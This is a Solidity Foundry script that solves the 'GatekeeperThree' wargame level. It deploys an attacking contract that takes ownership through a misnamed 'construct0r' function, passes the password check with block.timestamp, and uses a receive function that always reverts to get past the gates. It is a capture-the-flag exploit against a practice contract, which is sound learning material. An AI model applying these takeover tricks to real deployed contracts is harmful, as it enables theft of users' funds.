
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface IGatekeeperThree{
    function trick() external returns(address);
}

contract Solver is Script {
    address gatekeeper_three = vm.envAddress("GATEKEEPERTHREE_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        GateBreaker gatebreaker = new GateBreaker(gatekeeper_three); // createTrick()
        
        gatebreaker.getAllowance();

        gatekeeper_three.call{value: 0.001 ether + 1}("");
        console.log("gatekeeper_three balance: ", gatekeeper_three.balance);

        gatebreaker.construct0r();
        gatebreaker.enter();

        vm.stopBroadcast();
    }
}


contract GateBreaker {
    address gatekeeper_three;

    constructor(address _gatekeeper_three)  {
        gatekeeper_three = _gatekeeper_three;
        _gatekeeper_three.call(abi.encodeWithSignature("createTrick()"));
    }

    function getAllowance() external {
        gatekeeper_three.call(abi.encodeWithSignature("getAllowance(uint256)", uint256(block.timestamp)));
    }

    function construct0r() external {
        gatekeeper_three.call(abi.encodeWithSignature("construct0r()"));
    }

    function enter() external {
        gatekeeper_three.call(abi.encodeWithSignature("enter()"));
    }

    receive() external payable {
        revert();
    }
}